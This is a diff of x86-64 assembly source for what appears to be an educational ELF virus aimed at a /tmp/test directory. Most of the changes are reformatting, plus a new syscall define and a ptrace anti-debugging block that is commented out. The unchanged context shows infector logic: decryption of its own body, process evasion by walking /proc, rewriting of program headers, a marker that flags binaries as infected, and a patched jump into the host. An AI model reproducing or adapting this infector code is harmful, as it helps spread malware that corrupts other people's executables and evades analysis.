@@ -1,20 +1,22 @@
-%define SYS_READ		0
-%define SYS_WRITE		1
-%define SYS_OPEN 		2
-%define SYS_CLOSE		3
-%define SYS_STAT		4
-%define SYS_FSTAT		5
-%define SYS_LSEEK		8
-%define SYS_MPROTECT	10
-%define SYS_PREAD64		17
-%define SYS_PWRITE64	18
-%define SYS_EXIT		60
-%define SYS_CHDIR		80
-%define SYS_PTRACE		101
-%define SYS_GETUID		107
-%define SYS_GETGID		108
-%define SYS_SYNC		162
-%define SYS_GETDENTS64	217
+%define SYS_READ			0
+%define SYS_WRITE			1
+%define SYS_OPEN 			2
+%define SYS_CLOSE			3
+%define SYS_STAT			4
+%define SYS_FSTAT			5
+%define SYS_LSEEK			8
+%define SYS_MPROTECT		10
+%define SYS_PREAD64			17
+%define SYS_PWRITE64		18
+%define SYS_EXIT			60
+%define SYS_CHDIR			80
+%define SYS_PTRACE			101
+%define SYS_GETUID			107
+%define SYS_GETGID			108
+%define SYS_SYNC			162
+%define SYS_GETDENTS64		217
+%define SYS_CLOCK_GETTIME	228
+
 %define S_IFDIR 0x4000
 %define O_RDONLY 00
 %define S_IFMT 0xf000
@@ -40,7 +42,7 @@
 %define DT_DIR 4
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;             BUFFER           ;
+;             STACK            ;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; r15 /tmp/test                                     directory /tmp/test name
@@ -102,25 +104,25 @@ global _start
 
 section .text
 _start:
-	mov r9, [rsp + 8]; save program name
+	mov r9, [rsp + 8]							; save program name
 	push rdx
 	push rsp
-	sub  rsp, WAR_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
+	sub  rsp, WAR_STACK_SIZE                    ; Reserve some space in the register r15 to store all the data needed by the program
 	mov r15, rsp
 
-_ptrace_anti_debug:
-	mov rdi, PTRACE_TRACEME
-	mov rsi, SELF_PID
-	lea rdx, 1
-	mov r10, 0
-	mov rax, SYS_PTRACE
-	syscall
+; _ptrace_anti_debug:
+; 	mov rdi, PTRACE_TRACEME
+; 	mov rsi, SELF_PID
+; 	lea rdx, 1
+; 	mov r10, 0
+; 	mov rax, SYS_PTRACE
+; 	syscall
 
-	cmp rax, 0
-	jl _end
+; 	cmp rax, 0
+; 	jl _end
 
-	mov rax, SYS_GETGID
-	syscall
+; 	mov rax, SYS_GETGID
+; 	syscall
 
 _is_encrypted:
 	lea rdi, [r9]
@@ -160,7 +162,7 @@ _decypher:
 
 _payload:
 
-_evade_specific_process:                                  ; cd to /proc
+_evade_specific_process:								; cd to /proc
 	mov qword [r15], '/pro'
 	mov qword [r15 + 4], 'c'
 	lea rdi, [r15]
@@ -178,23 +180,23 @@ _evade_specific_process:                                  ; cd to /proc
 		mov rax, SYS_OPEN
 		syscall
 
-		test rax, rax                                  ; checking open
+		test rax, rax									; checking open
 		js _end
 
-		mov [r15 + 16], rax                            ; saving /tmp/test open fd
+		mov [r15 + 16], rax								; saving /tmp/test open fd
 
-	_iterate_over_proc:                                  ; getdents the /proc dir to iterate over all the process folders
+	_iterate_over_proc:									; getdents the /proc dir to iterate over all the process folders
 		mov rdi, [r15 + 16]
 		lea rsi, [r15 + 176]
 		mov rdx, DIRENT_BUFFSIZE
 		mov rax, SYS_GETDENTS64
 		syscall
 
-		cmp rax, 0                                     ; no more files in the directory to read
+		cmp rax, 0										; no more files in the directory to read
 		je _close_proc
 
-		xor r14, r14                                   ; i = 0 for the first iteration
-		mov r13, rax                                   ; r13 stores the number of read bytes with getdents
+		xor r14, r14									; i = 0 for the first iteration
+		mov r13, rax									; r13 stores the number of read bytes with getdents
 		_proc_loop:
 			movzx r12d, word [r15 + 192 + r14]
 
@@ -651,7 +653,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rax, SYS_SYNC
 			syscall
 
-		_rewrite_phdr:                             ; writes new header modifications to the binary
+		_rewrite_phdr:								; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
 			xor rdi, 0x0101
 			lea rsi, [r15 + 1424]
@@ -659,7 +661,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rdx, PHDR_SIZE
 			mov rsi, rax
 			imul rax, rax, 1
-			mov qword r10, [r15 + 1492]            ; offset to the phdr
+			mov qword r10, [r15 + 1492]				; offset to the phdr
 			mov rax, SYS_PWRITE64
 			xor rdi, 0x0101
 			syscall
@@ -671,7 +673,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov qword r9, [r15 + 1440]
 			mov qword [r15 + 1324], r9
 
-			mov byte [r15 + 1308], 'I'              ; sign as infected
+			mov byte [r15 + 1308], 'I'				; sign as infected
 
 			mov rdi, [r15 + 1420]
 			mov rax, rdi
@@ -699,7 +701,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			jle _close_bin
 
 			mov rdx, [r15 + 1440]
-			add rdx, 5 							   ; JMP + 0xNNNNNNNN (5 bytes)
+			add rdx, 5								; JMP + 0xNNNNNNNN (5 bytes)
 			sub [r15 + 1508], rdx
 			sub dword [r15 + 1508], _stop - _start
 			mov byte [r15 + 1516], 0xe9
@@ -733,8 +735,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 	_continue_dirent:
 		add r14, r12
 		cmp r14, r13
-		jne _dirent_loop                           ; if it has still files to read continues to the next one
-		jmp _dirent_tmp_test                       ; else, do the getdents again
+		jne _dirent_loop								; if it has still files to read continues to the next one
+		jmp _dirent_tmp_test							; else, do the getdents again
 
 		mov rax, SYS_SYNC
 		syscall
